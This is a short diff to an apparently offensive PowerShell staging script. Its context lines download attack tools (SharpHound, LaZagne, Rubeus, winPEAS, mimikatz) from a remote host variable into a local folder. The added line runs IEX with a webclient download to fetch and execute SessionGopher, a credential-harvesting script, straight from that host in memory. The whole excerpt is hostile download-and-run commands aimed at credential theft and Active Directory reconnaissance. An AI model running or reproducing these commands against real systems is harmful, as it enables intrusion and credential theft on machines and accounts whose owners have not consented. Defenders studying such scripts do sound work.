@@ -25,6 +25,7 @@ iwr $url_1029384756/tools/SharpHound.exe  -OutFile C:/blood/SharpHound.exe
 iwr $url_1029384756/tools/lazagne.exe -OutFile C:/blood/lazagne.exe
 iwr $url_1029384756/tools/Rubeus.exe -OutFile C:/blood/Rubeus.exe
 iwr $url_1029384756/tools/winPEASany_ofs.exe -OutFile C:/blood/winPEASany_ofs.exe
+IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SessionGopher.ps1")
 
 Expand-Archive -LiteralPath 'C:/blood/mimikatz.zip' -DestinationPath 'C:/blood/'
 del mimikatz.zip
